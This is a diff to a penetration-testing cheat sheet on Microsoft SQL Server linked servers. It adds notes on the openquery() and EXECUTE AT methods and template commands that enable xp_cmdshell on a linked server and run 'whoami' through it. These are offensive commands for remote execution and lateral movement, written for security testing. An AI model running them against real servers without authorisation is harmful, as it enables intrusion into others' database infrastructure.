@@ -1643,6 +1643,10 @@ Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell
 Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
 ```
 
+#### Manually
+- https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links
+- There is two methods ```openquery()``` and ```EXECUTE AT```. The one might work over the other, must try both!
+
 #### Manually enumerate database links query
 ```
 SELECT * FROM master..sysservers
@@ -1650,7 +1654,14 @@ SELECT * FROM master..sysservers
  
 #### Query a link for links
 ```
-SELECT * FROM OPENQUERY("UATSERVER\DB2", 'SELECT * FROM master..sysservers;')
+SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM master..sysservers;')
+```
+ 
+#### EXECUTE AT Example
+- Another way of executing through links
+```
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<SERVER>\<DB>"
+EXECUTE('exec master..xp_cmdshell ''whoami''') AT "<SERVER>\<DB>"
 ```
  
 ### Privilege escalation Service Accounts
